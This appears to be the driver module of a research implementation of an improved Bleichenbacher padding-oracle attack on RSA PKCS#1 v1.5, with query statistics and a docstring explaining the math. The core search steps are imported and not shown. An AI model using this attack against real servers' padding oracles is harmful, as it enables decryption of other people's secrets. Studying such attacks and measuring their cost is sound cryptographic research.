#
# This code is based on code copyright Livia Capol, 2021
#

from dataclasses import dataclass
from typing import Tuple, Optional, Dict, Any, Callable
import logging
import time

import reversebleichenbacher.trimmer as trimmer
import reversebleichenbacher.search as search
import reversebleichenbacher.bottom_up as bottom_up
import reversebleichenbacher.utils as utils

# Setup logging
level = logging.INFO
# level = logging.DEBUG
FORMAT = "[%(levelname)s] %(funcName)s:%(lineno)s - %(message)s"
logging.basicConfig(
    level=level,
    format=FORMAT
)   

class DebugStatistics:
    
    def __init__(self):
        pass

class Statistics:
    
    def __init__(self, logger):
        self.oracle_queries = dict()
        self.round_trips = dict()
        self.step = None
        self.error = None
        self.result = None
        self.total_queries = 0
        self.total_round_trips = 0
        self.logger = logger
        self.debug_statistics = None
        self.start = time.time()
        self.runtime = None
        self.tau = 1
        self.set_step("init")
    
    def set_step(self, step):
        if self.step is not None:
            self.logger.info(f"finishing step {self.step} with {self.oracle_queries[self.step]} queries and {self.round_trips[self.step]} round trips")
        self.oracle_queries[step] = 0
        self.round_trips[step] = 0
        self.step = step
        self.logger.info(f"starting step {step}")
    
    def set_error(self, error):
        if self.error is None:
            self.error = error
            self.result = self.step
        self.runtime = time.time() - self.start
    
    def done(self):
        if self.error is None:
            self.result = "ok"
            self.step = "done"
            self.runtime = time.time() - self.start
    
    def update(self, total_queries, total_round_trips):
        new_queries = total_queries - self.total_queries
        new_round_trips = total_round_trips - self.total_round_trips
        self.oracle_queries[self.step] += new_queries
        self.round_trips[self.step] += new_round_trips
        self.total_queries = total_queries
        self.total_round_trips = total_round_trips
    
    def to_dict(self):
        return {
            "oracle_queries": self.oracle_queries,
            "round_trips": self.round_trips,
            "step": self.step,
            "error": str(self.error),
            "result": self.result,
            "total_queries": self.total_queries,
            "total_round_trips": self.total_round_trips,
            "debug_statistics": self.debug_statistics,
            "runtime": self.runtime,
            "tau": self.tau
        }
    
    def __repr__(self):
        return f"Statistics({self.oracle_queries}, {self.round_trips}, {repr(self.step)}, {repr(str(self.error))}, {repr(self.result)}, {self.total_queries}, {self.total_round_trips})"

    def print_stats(self):
        self.logger.info(f"{'step':<12} {'queries':>7} {'round-trips':>13}")
        for step in self.oracle_queries.keys():
            self.logger.info(f"{step:<12} {self.oracle_queries[step]:>7} {self.round_trips[step]:>13}")
        self.logger.info(f"{'total':<12} {self.total_queries:>7} {self.total_round_trips:>13}")
        if self.error is not None:
            self.logger.info(f"Error: {self.error}")

class AttackState:
    
    def __init__(self, rsa, config, oracle, logger, m = None):
        self.m = m
        self.rsa = rsa
        self.low = utils.pkcs_lower_bound(rsa.B)
        self.high = utils.pkcs_upper_bound(rsa.B)
        self.trimmer = 1
        self.config = config
        self.stats = Statistics(logger)
        if m is not None:
            self.stats.debug = DebugStatistics()
        self.oracle = oracle

class CapolBleichenAttack():
    """
    Implementation of an improved Bleichenbacher attack on PKCS#1 v1.5 padding.
    
    This class implements the Bleichenbacher attack
    against RSA encryption with PKCS#1 v1.5 padding. The attack exploits a padding
    oracle that reveals whether a ciphertext decrypts to a valid PKCS#1 v1.5 formatted
    message.
    
    Mathematical Notation:
    ---------------------
    - n: RSA modulus (public key component)
    - e: RSA public exponent (typically 65537)
    - k: Key length in bytes (k = keylength // 8)
    - B: Lower bound for valid PKCS#1 v1.5 padding, B = 2^(8*(k-2))
    - m: Secret message we want to recover (the plaintext)
    - c: Ciphertext (c = m^e mod n)
    - [a, b]: Current interval containing the secret message m, where a ≤ m ≤ b
    - s: Multiplier used in the attack to narrow down the interval
    - Oracle(s): Returns True if (c * s^e) mod n decrypts to valid PKCS#1 v1.5 padding
    
    Attack Overview:
    ----------------
    The attack works by:
    1. Starting with an interval [2B, 3B-1] that must contain m (for valid PKCS#1 v1.5)
    2. Using the oracle to find multipliers s that narrow down the interval
    3. Iteratively reducing the interval until m is uniquely determined
    4. Using a novel "bottom-up" approach to recover the least significant bits of m
    
    Key Innovation:
    ---------------
    The `bottom_up` method is the novel contribution - it recovers the least significant
    bits of the secret message using modular arithmetic and LCM (Least Common Multiple)
    techniques, significantly reducing the number of oracle queries needed.
    """
    def __init__(self, config):
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(config.general.log_level)
    
    def attack(self, rsa, oracle, m = None):
        state = AttackState(rsa, self.config, oracle, self.logger, m=m)

        # select the right functions based on the config
        find_trimmers = trimmer.find_trimmers_parallel if self.config.general.parallel else trimmer.find_trimmers
        do_search = search.search_parallel if self.config.general.parallel else search.search
        do_bottom_up = bottom_up.bottom_up_parallel if self.config.general.parallel else bottom_up.bottom_up
        
        # set initial statistics
        state.stats.update(oracle.calls, oracle.round_trips)

        # finding trimmers
        state.stats.set_step("trimmer")
        try:
            lcm, low, high = find_trimmers(state.config.trimmer, state.rsa, state.oracle)
            state.stats.tau = lcm
        except Exception as e:
            state.stats.update(oracle.calls, oracle.round_trips)
            state.stats.set_error(e)
            state.stats.print_stats()
            return None, state.stats
        state.lcm = lcm
        state.stats.update(state.oracle.calls, state.oracle.round_trips)
        state.low = (utils.pkcs_lower_bound(state.rsa.B) * state.lcm) // low
        state.high = (utils.pkcs_upper_bound(state.rsa.B) * state.lcm) // high + 1
        self.logger.info(f"found trimmer {lcm}")
        
        # step 2a / search
        state.stats.set_step("search")
        try:
            low, high = do_search(state.lcm, state.low, state.high, state.rsa, state.oracle, state.config.search)
        except Exception as e:
            state.stats.update(state.oracle.calls, state.oracle.round_trips)
            state.stats.set_error(e)
            state.stats.print_stats()
            return None, state.stats
        state.stats.update(state.oracle.calls, state.oracle.round_trips)
        state.low = low
        state.high = high

        # step 2b / bottom-up
        state.stats.set_step("bottom_up")
        try:
            secret = do_bottom_up(self.logger, state.oracle, state.rsa, state.lcm, state.low, state.high, state.config.bottom_up)
        except Exception as e:
            state.stats.update(state.oracle.calls, state.oracle.round_trips)
            state.stats.set_error(e)
            state.stats.print_stats()
            return None, state.stats
        state.stats.update(state.oracle.calls, state.oracle.round_trips)
        
        state.stats.done()
        
        self.logger.info(f"total time: {state.stats.runtime}s.")
        state.stats.print_stats()

        return secret, state.stats
    
# ============================================================================
